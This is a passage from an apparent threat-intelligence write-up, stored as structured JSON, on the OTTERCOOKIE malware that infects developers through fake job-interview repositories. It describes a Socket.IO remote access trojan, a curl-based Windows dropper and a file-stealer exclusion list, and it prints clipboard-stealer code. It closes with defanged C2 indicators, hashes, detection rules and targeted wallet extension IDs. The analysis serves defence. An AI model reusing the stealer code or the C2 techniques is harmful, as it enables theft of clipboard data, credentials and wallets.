+   "text": "\"node_modules\", \"npm\", \"hooks\", \"android\", \"example\", \"AppData\", \"vendors\", \"vendor\", \"public\", \"css\", \"less\", \"scss\", \".cache\", \".conda\", \".move\", \".tldrc\", \".android\", \".avm\", \".brownie\", \".3T\", \".node-gyp\", \".gk\", \".claude\", \".cocoapods\", \".conda\", \".cursor\", \".devctl\", \".eigent\", \".nvm\", \".stream\", \".steam\", \".windsurf\", \".gnupg\", \".pm2\", \".snipaste\", \".vue-cli-ui\", \".cursor\", \".vscode-server\", \".cargo\", \".local\", \".rustup\", \".pub-cache\", \".Trash\", \".dll\", \".dmg\", \".exe\", \".sh\", \".bin\", \"module\", \".map\", \".jar\", \".original\", \".yml\", \".yaml\", \"flutter\", \"llama\", \".ppt\", \".cl\", \".psd\", \".pak\", \".pages\", \".gemini\", \".pearai\", \"extension\", \"media\", \".key\", \".var\", \".sst\", \".pkg\", \".pack\", \".msi\", \".apk\", \".aep\", \".3mf\", \".big\", \".bundle\", \".hpp\", \".cdr\", \".car\", \".cfa\", \".cab\", \".mp4\", \".wma\", \"DCIM\", \".webm\", \".dylib\", \".nvm\", \".sol\", \".mp3\", \".sys\", \".avi\", \".so\", \".sqlite\", \".dat\", \".jar\", \"anaconda3\", \".yarn\", \"build\", \".next\", \".git\", \".gitignore\", \".github\", \"cache\", \"tmp\", \"temp\", \"dist\", \"library\", \"lib\", \"mysql\", \"imgs\", \"img\", \"images\", \"image\", \"plugin\", \"plugin\", \".vscode\", \"package-lock.json\", \".pyp\", \".myi\", \".rustup\", \".docker\", \"manifest\", \".expo\", \"AppData\", \"windows.old\", \"pkg\", \"package\", \"packages\", \"openzeppelin\", \"prisma\", \"pkgs\", \"fonts\", \"debug\", \"background\", \"wallpaper\", \"_locales\", \"locale\", \"locales\", \"Program\\x20Files\", \"Program Files (x86)\", \"ProgramData\", \"All Users\", \"All User\", \"Windows\", \"Microsoft\", \"$RECYCLE.BIN\", \"Visual Studio Code.app\",",
+   "type": "code",
+   "section": "What files this malware steals from developer machines"
+  },
+  {
+   "id": "b130",
+   "page": null,
+   "text": "Socket.IO-based RAT",
+   "type": "heading",
+   "level": 3,
+   "section": "Socket.IO-based RAT"
+  },
+  {
+   "id": "b131",
+   "page": null,
+   "text": "This third stage establishes a persistent Socket.IO command-and-control channel to the domain (controller.rightwidth[.]dev) over HTTPS. The malware ensures only one instance runs by enforcing a PID lock by writing its own process ID to a lock file in the user’s directory (C:\\Users\\jim\\.npm\\vhost.ctl).",
+   "type": "paragraph",
+   "section": "Socket.IO-based RAT"
+  },
+  {
+   "id": "b132",
+   "page": null,
+   "text": "The malware includes VM/sandbox detections for the different platforms. If there is a match, the malware places a tag in the C2 response with (VM) but does not stop or prevent it from running. This is likely used as a filtering mechanism to prioritize real victim machines over sandboxes/VMs.",
+   "type": "paragraph",
+   "section": "Socket.IO-based RAT"
+  },
+  {
+   "id": "b133",
+   "page": null,
+   "text": "The following table defines the VM detection mechanisms for each platform:",
+   "type": "paragraph",
+   "section": "Socket.IO-based RAT"
+  },
+  {
+   "id": "b134",
+   "page": null,
+   "text": "Operating System | Query | String Check ¶ Windows | Retrieves system details using the WMIC command: wmic computersystem get model,manufacturer | vmware, virtualbox, qemu, microsoft corporation ¶ macOS | Retrieves the system details using the command: system_profiler SPHardwareDataType | /vmware|virtualbox|qemu|parallels|virtual/ ¶ Linux | Reads system details using /proc/cpuinfo | /hypervisor|vmware|virtualbox|qemu|kvm|xen|parallels|bochs\\/i",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "Windows",
+      "Retrieves system details using the WMIC command: wmic computersystem get model,manufacturer",
+      "vmware, virtualbox, qemu, microsoft corporation"
+     ],
+     [
+      "macOS",
+      "Retrieves the system details using the command: system_profiler SPHardwareDataType",
+      "/vmware|virtualbox|qemu|parallels|virtual/"
+     ],
+     [
+      "Linux",
+      "Reads system details using /proc/cpuinfo",
+      "/hypervisor|vmware|virtualbox|qemu|kvm|xen|parallels|bochs\\/i"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "Operating System",
+     "Query",
+     "String Check"
+    ]
+   },
+   "layout": "table",
+   "section": "Socket.IO-based RAT"
+  },
+  {
+   "id": "b135",
+   "page": null,
+   "text": "A registration beacon is sent to the domain (controller.rightwidth[.]dev) using endpoint /api/service/process/<uid>. This includes the system host information, letting the threat actor know a new victim has been added.",
+   "type": "paragraph",
+   "section": "Socket.IO-based RAT"
+  },
+  {
+   "id": "b136",
+   "page": null,
+   "text": "OTTERCOOKIE malware registers a new infected host with its Contagious Interview command and control server",
+   "type": "paragraph",
+   "section": "Socket.IO-based RAT"
+  },
+  {
+   "id": "b137",
+   "page": null,
+   "text": "The malware uses a logging channel (/api/service/makelog), which keeps the operator informed of the implant’s health and any errors.",
+   "type": "paragraph",
+   "section": "Socket.IO-based RAT"
+  },
+  {
+   "id": "b138",
+   "page": null,
+   "text": "OTTERCOOKIE malware installs a Socket.IO client to establish command and control on an infected machine",
+   "type": "paragraph",
+   "section": "Socket.IO-based RAT"
+  },
+  {
+   "id": "b139",
+   "page": null,
+   "text": "The operator sends a command event containing a shell command, which the implant executes via child_process.exec() and returns the output as a message event over the same Socket.IO connection. This gives the operator interactive shell access to the victim machine in real time. Below is an example response from a victim machine running whoami:",
+   "type": "paragraph",
+   "section": "Socket.IO-based RAT"
+  },
+  {
+   "id": "b140",
+   "page": null,
+   "text": "OTTERCOOKIE's Socket.IO remote access trojan executes a whoami command on a victim machine",
+   "type": "paragraph",
+   "section": "Socket.IO-based RAT"
+  },
+  {
+   "id": "b141",
+   "page": null,
+   "text": "Clipboard stealer and Windows payload dropper",
+   "type": "heading",
+   "level": 3,
+   "section": "Clipboard stealer and Windows payload dropper"
+  },
+  {
+   "id": "b142",
+   "page": null,
+   "text": "The fourth module contains two separate capabilities: Windows dropper functionality and a clipboard stealer.",
+   "type": "paragraph",
+   "section": "Clipboard stealer and Windows payload dropper"
+  },
+  {
+   "id": "b143",
+   "page": null,
+   "text": "The dropper component is Windows-only and downloads three second-stage binaries via curl from file.rightwidth[.]dev, each disguised as a .txt file, then renamed to .exe before execution. The C2 server was unavailable at the time of analysis, so the payloads could not be retrieved. Based on their naming convention, they may relate to additional discovery or enumeration capabilities, but this is unconfirmed.",
+   "type": "paragraph",
+   "section": "Clipboard stealer and Windows payload dropper"
+  },
+  {
+   "id": "b144",
+   "page": null,
+   "text": "hostService.txt -> hostService.exe",
+   "type": "list",
+   "section": "Clipboard stealer and Windows payload dropper"
+  },
+  {
+   "id": "b145",
+   "page": null,
+   "text": "printSvc.txt -> printSvc.exe",
+   "type": "list",
+   "section": "Clipboard stealer and Windows payload dropper"
+  },
+  {
+   "id": "b146",
+   "page": null,
+   "text": "dhcpSvc.txt -> dhcpSvc.exe",
+   "type": "list",
+   "section": "Clipboard stealer and Windows payload dropper"
+  },
+  {
+   "id": "b147",
+   "page": null,
+   "text": "OTTERCOOKIE malware requests three second-stage payloads: hostService.txt, printSvc.txt, and dhcpSvc.txt",
+   "type": "paragraph",
+   "section": "Clipboard stealer and Windows payload dropper"
+  },
+  {
+   "id": "b148",
+   "page": null,
+   "text": "The clipboard functionality is only available on macOS and Windows. The malware polls every 500ms for new clipboard content, exfiltrating any changes to the C2 server (rightwidth[.]dev) via POST requests using endpoint (/api/service/makelog/).",
+   "type": "paragraph",
+   "section": "Clipboard stealer and Windows payload dropper"
+  },
+  {
+   "id": "b149",
+   "page": null,
+   "text": "For macOS devices, pbpaste is used to retrieve the clipboard contents from victim machines.",
+   "type": "paragraph",
+   "section": "Clipboard stealer and Windows payload dropper"
+  },
+  {
+   "id": "b150",
+   "page": null,
+   "text": "const getClipboard = async () => {",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b151",
+   "page": null,
+   "text": "try {",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b152",
+   "page": null,
+   "text": "if (os.platform() === \"darwin\") {",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b153",
+   "page": null,
+   "text": "return execSync(\"pbpaste\", { encoding: \"utf8\" }).trim();",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b154",
+   "page": null,
+   "text": "if (os.platform() === \"win32\") {",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b155",
+   "page": null,
+   "text": "return execSync(\"powershell -NoProfile -NonInteractive Get-Clipboard\", {",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b156",
+   "page": null,
+   "text": "encoding: \"utf8\",",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b157",
+   "page": null,
+   "text": "windowsHide: true,",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b158",
+   "page": null,
+   "text": "}).trim();",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b159",
+   "page": null,
+   "text": "// Linux: no implementation — returns null every poll, loop is a no-op",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b160",
+   "page": null,
+   "text": "return null;",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b161",
+   "page": null,
+   "text": "} catch (_) {",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b162",
+   "page": null,
+   "text": "return null;",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b163",
+   "page": null,
+   "text": "};",
+   "type": "code",
+   "section": "Clipboard stealer and Windows payload dropper",
+   "line_group": "b150"
+  },
+  {
+   "id": "b164",
+   "page": null,
+   "text": "On Windows, a new PowerShell process is spawned every 500ms via Get-Clipboard to retrieve the current clipboard contents. Below is an example process tree showing the clipboard module in action:",
+   "type": "paragraph",
+   "section": "Clipboard stealer and Windows payload dropper"
+  },
+  {
+   "id": "b165",
+   "page": null,
+   "text": "OTTERCOOKIE's clipboard stealer spawns PowerShell from node.exe, captured in Elastic Defend",
+   "type": "paragraph",
+   "section": "Clipboard stealer and Windows payload dropper"
+  },
+  {
+   "id": "b166",
+   "page": null,
+   "text": "Conclusion",
+   "type": "heading",
+   "level": 2,
+   "section": "Conclusion"
+  },
+  {
+   "id": "b167",
+   "page": null,
+   "text": "Developers remain a high-value target, with campaigns like these likely seeking to establish an initial foothold that can ultimately enable larger supply chain compromises. The success of these operations underscores how compromising an individual developer can provide a path to much broader organizational impact.",
+   "type": "paragraph",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b168",
+   "page": null,
+   "text": "By sharing our findings, we hope to help organizations and developers recognize these tactics earlier, identify similar activity in their own environments, and take action before an initial compromise escalates into a wider intrusion.",
+   "type": "paragraph",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b169",
+   "page": null,
+   "text": "Contagious Interview malware: MITRE ATT&CK techniques and tactics",
+   "type": "heading",
+   "level": 2,
+   "section": "Contagious Interview malware: MITRE ATT&CK techniques and tactics"
+  },
+  {
+   "id": "b170",
+   "page": null,
+   "text": "Elastic uses the MITRE ATT&CK framework to document common tactics, techniques, and procedures that threats use against enterprise networks.",
+   "type": "paragraph",
+   "section": "Contagious Interview malware: MITRE ATT&CK techniques and tactics"
+  },
+  {
+   "id": "b171",
+   "page": null,
+   "text": "Tactics",
+   "type": "heading",
+   "level": 3,
+   "section": "Tactics"
+  },
+  {
+   "id": "b172",
+   "page": null,
+   "text": "Tactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.",
+   "type": "paragraph",
+   "section": "Tactics"
+  },
+  {
+   "id": "b173",
+   "page": null,
+   "text": "Collection",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b174",
+   "page": null,
+   "text": "Command and Control",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b175",
+   "page": null,
+   "text": "Credential Access",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b176",
+   "page": null,
+   "text": "Discovery",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b177",
+   "page": null,
+   "text": "Execution",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b178",
+   "page": null,
+   "text": "Exfiltration",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b179",
+   "page": null,
+   "text": "Initial Access",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b180",
+   "page": null,
+   "text": "Techniques",
+   "type": "heading",
+   "level": 3,
+   "section": "Techniques"
+  },
+  {
+   "id": "b181",
+   "page": null,
+   "text": "Techniques represent how an adversary achieves a tactical goal by performing an action.",
+   "type": "paragraph",
+   "section": "Techniques"
+  },
+  {
+   "id": "b182",
+   "page": null,
+   "text": "Application Layer Protocol: Web Protocols",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b183",
+   "page": null,
+   "text": "Clipboard Data",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b184",
+   "page": null,
+   "text": "Credentials from Password Stores",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b185",
+   "page": null,
+   "text": "Data from Local System",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b186",
+   "page": null,
+   "text": "Data Obfuscation: Steganography",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b187",
+   "page": null,
+   "text": "Exfiltration Over C2 Channel",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b188",
+   "page": null,
+   "text": "File and Directory Discovery",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b189",
+   "page": null,
+   "text": "System Information Discovery",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b190",
+   "page": null,
+   "text": "How to detect and prevent this Contagious Interview malware campaign",
+   "type": "heading",
+   "level": 2,
+   "section": "How to detect and prevent this Contagious Interview malware campaign"
+  },
+  {
+   "id": "b191",
+   "page": null,
+   "text": "Detection and prevention rules",
+   "type": "heading",
+   "level": 3,
+   "section": "Detection and prevention rules"
+  },
+  {
+   "id": "b192",
+   "page": null,
+   "text": "Web Browser Credential Access via Scripting Utility",
+   "type": "list",
+   "section": "Detection and prevention rules"
+  },
+  {
+   "id": "b193",
+   "page": null,
+   "text": "Ingress Tool Transfer via CURL",
+   "type": "list",
+   "section": "Detection and prevention rules"
+  },
+  {
+   "id": "b194",
+   "page": null,
+   "text": "Potential File Transfer via Curl for Windows",
+   "type": "list",
+   "section": "Detection and prevention rules"
+  },
+  {
+   "id": "b195",
+   "page": null,
+   "text": "Observables",
+   "type": "heading",
+   "level": 2,
+   "section": "Observables"
+  },
+  {
+   "id": "b196",
+   "page": null,
+   "text": "The following observables were discussed in this research.",
+   "type": "paragraph",
+   "section": "Observables"
+  },
+  {
+   "id": "b197",
+   "page": null,
+   "text": "Observable | Type | Name | Reference ¶ 8e571d58794b9b44ae53c2c67bedef72c500e8adbb80aab7a5c263adcba55b1e | SHA-256 | ecommerce-main.zip | Trojanized repository ¶ 3e6360f83a95540aa2176d279ca4694513afb1e5116a7ffe591c6b5bcf3b9c3c | SHA-256 | next-ecommerce-private-main.zip | Trojanized repository ¶ 4e7639045b4a64de60bfb6312951a5c3dffbd3fb04b84837663242ed27f09864 | SHA-256 | shopping-platform-main.zip | Trojanized repository ¶ 54bf36910d81ab516037cb3d69d7c85190f90aa0da9e58617799c1fc738dc5a9 | SHA-256 | ecommerce-platform.zip | Trojanized repository ¶ 96357529d17c4690826d5d4c74deac51743a5388733b3f04004d898f0635ef20 | SHA-256 | shop-main.zip | Trojanized repository ¶ 9df01d242ef46adfedf8c35cb7cc67b1d27d7dc4a1ce74ab32e984090d579886 | SHA-256 | ecommerce-platform-main.zip | Trojanized repository ¶ c5aed4c063d4970a03250778da8041da9e0c83d8f22d2f1994da0ad72567ebd9 | SHA-256 | shopping-platform.rar | Trojanized repository ¶ cc97517f80f567977300450de11e9a0be53f52657525a20b1091c99fe9e45730 | SHA-256 | shopping-platform.rar | Trojanized repository ¶ fb94b2caee2c40635448a98ba0118421e19a400e74ccff73315f8fa42351f53f | SHA-256 | shop-main.zip | Trojanized repository ¶ rightwidth[.]dev | domain-name |  | OTTERCOOKIE C2 Server ¶ ldb.rightwidth[.]dev | domain-name |  | Browser and wallet stealer C2 ¶ upload.rightwidth[.]dev | domain-name |  | File stealer upload C2 ¶ controller.rightwidth[.]dev | domain-name |  | Socket.IO RAT C2 ¶ file.rightwidth[.]dev | domain-name |  | Windows second-stage download host ¶ 195.26.248[.]212 | ipv4 |  | OTTERCOOKIE C2 Server ¶ 188.40.64[.]61 | ipv4 |  | OTTERCOOKIE C2 Server",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "8e571d58794b9b44ae53c2c67bedef72c500e8adbb80aab7a5c263adcba55b1e",
+      "SHA-256",
+      "ecommerce-main.zip",
+      "Trojanized repository"
+     ],
+     [
+      "3e6360f83a95540aa2176d279ca4694513afb1e5116a7ffe591c6b5bcf3b9c3c",
+      "SHA-256",
+      "next-ecommerce-private-main.zip",
+      "Trojanized repository"
+     ],
+     [
+      "4e7639045b4a64de60bfb6312951a5c3dffbd3fb04b84837663242ed27f09864",
+      "SHA-256",
+      "shopping-platform-main.zip",
+      "Trojanized repository"
+     ],
+     [
+      "54bf36910d81ab516037cb3d69d7c85190f90aa0da9e58617799c1fc738dc5a9",
+      "SHA-256",
+      "ecommerce-platform.zip",
+      "Trojanized repository"
+     ],
+     [
+      "96357529d17c4690826d5d4c74deac51743a5388733b3f04004d898f0635ef20",
+      "SHA-256",
+      "shop-main.zip",
+      "Trojanized repository"
+     ],
+     [
+      "9df01d242ef46adfedf8c35cb7cc67b1d27d7dc4a1ce74ab32e984090d579886",
+      "SHA-256",
+      "ecommerce-platform-main.zip",
+      "Trojanized repository"
+     ],
+     [
+      "c5aed4c063d4970a03250778da8041da9e0c83d8f22d2f1994da0ad72567ebd9",
+      "SHA-256",
+      "shopping-platform.rar",
+      "Trojanized repository"
+     ],
+     [
+      "cc97517f80f567977300450de11e9a0be53f52657525a20b1091c99fe9e45730",
+      "SHA-256",
+      "shopping-platform.rar",
+      "Trojanized repository"
+     ],
+     [
+      "fb94b2caee2c40635448a98ba0118421e19a400e74ccff73315f8fa42351f53f",
+      "SHA-256",
+      "shop-main.zip",
+      "Trojanized repository"
+     ],
+     [
+      "rightwidth[.]dev",
+      "domain-name",
+      "",
+      "OTTERCOOKIE C2 Server"
+     ],
+     [
+      "ldb.rightwidth[.]dev",
+      "domain-name",
+      "",
+      "Browser and wallet stealer C2"
+     ],
+     [
+      "upload.rightwidth[.]dev",
+      "domain-name",
+      "",
+      "File stealer upload C2"
+     ],
+     [
+      "controller.rightwidth[.]dev",
+      "domain-name",
+      "",
+      "Socket.IO RAT C2"
+     ],
+     [
+      "file.rightwidth[.]dev",
+      "domain-name",
+      "",
+      "Windows second-stage download host"
+     ],
+     [
+      "195.26.248[.]212",
+      "ipv4",
+      "",
+      "OTTERCOOKIE C2 Server"
+     ],
+     [
+      "188.40.64[.]61",
+      "ipv4",
+      "",
+      "OTTERCOOKIE C2 Server"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "Observable",
+     "Type",
+     "Name",
+     "Reference"
+    ]
+   },
+   "layout": "table",
+   "section": "Observables"
+  },
+  {
+   "id": "b198",
+   "page": null,
+   "text": "References",
+   "type": "heading",
+   "level": 2,
+   "section": "References"
+  },
+  {
+   "id": "b199",
+   "page": null,
+   "text": "The following were referenced throughout the above research:",
+   "type": "paragraph",
+   "section": "References"
+  },
+  {
+   "id": "b200",
+   "page": null,
+   "text": "Contagious Interview malware delivered through fake developer job interviews (Microsoft)",
+   "type": "list",
+   "section": "References"
+  },
+  {
+   "id": "b201",
+   "page": null,
+   "text": "OTTERCOOKIE Contagious Interview analysis (NTT Security)",
+   "type": "list",
+   "section": "References"
+  },
+  {
+   "id": "b202",
+   "page": null,
+   "text": "Rollup polyfill masquerading infrastructure (JFrog Security)",
+   "type": "list",
+   "section": "References"
+  },
+  {
+   "id": "b203",
+   "page": null,
+   "text": "Appendix: targeted cryptocurrency wallet extension IDs",
+   "type": "heading",
+   "level": 2,
+   "section": "Appendix: targeted cryptocurrency wallet extension IDs"
+  },
+  {
+   "id": "b204",
+   "page": null,
+   "text": "Extension ID | Wallet ¶ nkbihfbeogaeaoehlefnkodbefgpgknn | MetaMask Wallet ¶ acmacodkjbdgmoleebolmdjonilkdbch | Rabby Wallet ¶ bfnaelmomeimhlpmgjnjophhpkkoljpa | Phantom Wallet ¶ dmkamcknogkgcdfhhbddcghachkejeap | Keplr ¶ ejbalbakoplchlghecdalmeeeajnimhm | MetaMask (Edge) ¶ ppbibelpcjmhbdihakflkdcoccbgbkpo | UniSat Wallet ¶ egjidjbpglichdcondbcbdnbeeppgdph | Trust Wallet ¶ ibnejdfjmmkpcnlpebklmnkoeoihofec | TronLink Wallet ¶ bhhhlbepdkbapadjdnnojkbgioiodbic | Solflare Wallet ¶ omaabbefbmiijedngplfjmnooppbclkk | Tonkeeper ¶ khpkpbbcccdmmclmpigdgddabeilkdpd | Sui Wallet ¶ fhbohimaelbohpjbbldcngcnapndodjp | BNB Chain Wallet (Binance) ¶ aeachknmefphepccionboohckonoeemg | Coin98 ¶ hifafgmccdpekplomjjkcfgodnhcellj | Crypto.com Wallet ¶ jblndlipeogpafnldhgmapagcccfchpi | Kaia Wallet ¶ dlcobpjiigpikoobohmabehhmhfoodbb | Ready Wallet ¶ mcohilncbfahbmgdjkbpemcciiolgcge | OKX Wallet ¶ agoakfejjabomempkjlepdflaleeobhb | Core Wallet ¶ aholpfdialjgjfhomihkjbmgjidlcdno | Exodus Web3 Wallet ¶ nphplpgoakhhjchkkhmiggakijnkhfnd | TON Wallet ¶ penjlddjkjgpnkllboccdgccekpkcbin | OpenMask (TON) ¶ lgmpcpglpngdoalbgeoldeajfclnhafa | SafePal Wallet ¶ fldfpgipfncgndfolcbkdeeknbbbnhcc | My TON Wallet ¶ gjnckgkfmgmibbkoficdidcljeaaaheg | Atomic Wallet ¶ afbcbjpbpfadlkmhmclhkeeodmamcflc | MathWallet",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "nkbihfbeogaeaoehlefnkodbefgpgknn",
+      "MetaMask Wallet"
+     ],
+     [
+      "acmacodkjbdgmoleebolmdjonilkdbch",
+      "Rabby Wallet"
+     ],
+     [
+      "bfnaelmomeimhlpmgjnjophhpkkoljpa",
+      "Phantom Wallet"
+     ],
+     [
+      "dmkamcknogkgcdfhhbddcghachkejeap",
+      "Keplr"
+     ],
+     [
+      "ejbalbakoplchlghecdalmeeeajnimhm",
+      "MetaMask (Edge)"
+     ],
+     [
+      "ppbibelpcjmhbdihakflkdcoccbgbkpo",
+      "UniSat Wallet"
+     ],
+     [
+      "egjidjbpglichdcondbcbdnbeeppgdph",
+      "Trust Wallet"
+     ],
+     [
+      "ibnejdfjmmkpcnlpebklmnkoeoihofec",
+      "TronLink Wallet"
+     ],
+     [
+      "bhhhlbepdkbapadjdnnojkbgioiodbic",
+      "Solflare Wallet"
+     ],
+     [
+      "omaabbefbmiijedngplfjmnooppbclkk",
+      "Tonkeeper"
+     ],
+     [
+      "khpkpbbcccdmmclmpigdgddabeilkdpd",
+      "Sui Wallet"
+     ],
+     [
+      "fhbohimaelbohpjbbldcngcnapndodjp",
+      "BNB Chain Wallet (Binance)"
+     ],
+     [
+      "aeachknmefphepccionboohckonoeemg",
+      "Coin98"
+     ],
+     [
+      "hifafgmccdpekplomjjkcfgodnhcellj",
+      "Crypto.com Wallet"
+     ],
+     [
+      "jblndlipeogpafnldhgmapagcccfchpi",
+      "Kaia Wallet"
+     ],
+     [
+      "dlcobpjiigpikoobohmabehhmhfoodbb",
+      "Ready Wallet"
+     ],
+     [
+      "mcohilncbfahbmgdjkbpemcciiolgcge",
+      "OKX Wallet"
+     ],
+     [
+      "agoakfejjabomempkjlepdflaleeobhb",
+      "Core Wallet"
+     ],
+     [
+      "aholpfdialjgjfhomihkjbmgjidlcdno",
+      "Exodus Web3 Wallet"
+     ],
+     [
+      "nphplpgoakhhjchkkhmiggakijnkhfnd",
+      "TON Wallet"
+     ],
+     [
+      "penjlddjkjgpnkllboccdgccekpkcbin",
+      "OpenMask (TON)"
+     ],
+     [
+      "lgmpcpglpngdoalbgeoldeajfclnhafa",
+      "SafePal Wallet"
+     ],
+     [
+      "fldfpgipfncgndfolcbkdeeknbbbnhcc",
+      "My TON Wallet"
+     ],
+     [
+      "gjnckgkfmgmibbkoficdidcljeaaaheg",
+      "Atomic Wallet"
+     ],
+     [
+      "afbcbjpbpfadlkmhmclhkeeodmamcflc",
+      "MathWallet"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "Extension ID",
+     "Wallet"
+    ]
+   },
+   "layout": "table",
+   "section": "Appendix: targeted cryptocurrency wallet extension IDs"
+  },
+  {
+   "id": "b205",
+   "page": null,
+   "text": "Report an issue",
+   "type": "paragraph",
+   "section": "Appendix: targeted cryptocurrency wallet extension IDs"
+  },
+  {
+   "id": "b206",
+   "page": null,
+   "text": "Related Content",
+   "type": "heading",
+   "level": 3,
+   "section": "Related Content"
+  },
+  {
+   "id": "b207",
+   "page": null,
+   "text": "Auditing the auditor: Unmasking Apex Accelerator",
+   "type": "paragraph",
+   "section": "Related Content"
+  },
+  {
+   "id": "b208",
+   "page": null,
+   "text": "Malware AnalysisThreat IntelligenceAI Security",
+   "type": "paragraph",
+   "section": "Related Content"
+  },
+  {
+   "id": "b209",
+   "page": null,
+   "text": "Auditing the auditor: Unmasking Apex Accelerator",
+   "type": "heading",
+   "level": 3,
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b210",
+   "page": null,
+   "text": "October 12, 2026",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b211",
+   "page": null,
+   "text": "Jia Yu Chan",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b212",
+   "page": null,
+   "text": "+1",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b213",
+   "page": null,
+   "text": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b214",
+   "page": null,
+   "text": "Malware AnalysisThreat Intelligence",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b215",
+   "page": null,
+   "text": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions",
+   "type": "heading",
+   "level": 3,
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b216",
+   "page": null,
+   "text": "September 14, 2026",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b217",
+   "page": null,
+   "text": "Cyril François",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b218",
+   "page": null,
+   "text": "+1",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b219",
+   "page": null,
+   "text": "REVSTEALER ramps up: analysis of up-and-coming infostealer",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b220",
+   "page": null,
+   "text": "Detection EngineeringMalware AnalysisThreat Intelligence",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b221",
+   "page": null,
+   "text": "REVSTEALER ramps up: analysis of up-and-coming infostealer",
+   "type": "heading",
+   "level": 3,
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b222",
+   "page": null,
+   "text": "September 02, 2026",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b223",
+   "page": null,
+   "text": "Daniel Stepanic",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b224",
+   "page": null,
+   "text": "+2",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b225",
+   "page": null,
+   "text": "Shai-Hulud strikes again: CHAINDROP worm hits 400+ npm packages",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b226",
+   "page": null,
+   "text": "Threat Intelligence",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b227",
